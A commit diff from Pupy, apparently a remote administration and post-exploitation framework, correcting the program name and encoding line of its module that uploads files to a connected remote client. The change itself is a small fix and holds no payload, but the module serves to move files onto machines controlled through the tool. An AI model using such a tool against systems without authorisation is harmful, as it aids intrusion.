a337d1f37537e942c31955e767ab857fb11a9136
Oleksii Shevchuk <alxchk@gmail.com>
2016-08-21 17:08:48 +0300

    Fix download->upload

--- pupy/modules/upload.py
+++ pupy/modules/upload.py
@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 from pupylib.PupyModule import *
 from pupylib.PupyCompleter import *
 from rpyc.utils.classic import upload
@@ -11,10 +11,9 @@ __class_name__="UploaderScript"
 class UploaderScript(PupyModule):
     """ upload a file/directory to a remote system """
     def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='download', description=self.__doc__)
+        self.arg_parser = PupyArgumentParser(prog='upload', description=self.__doc__)
         self.arg_parser.add_argument('local_file', metavar='<local_path>', completer=path_completer)
         self.arg_parser.add_argument('remote_file', metavar='<remote_path>')
     def run(self, args):
         upload(self.client.conn, args.local_file, self.client.conn.modules['os.path'].expandvars(args.remote_file))
         self.success("file local:%s uploaded to remote:%s"%(args.local_file, args.remote_file))
-
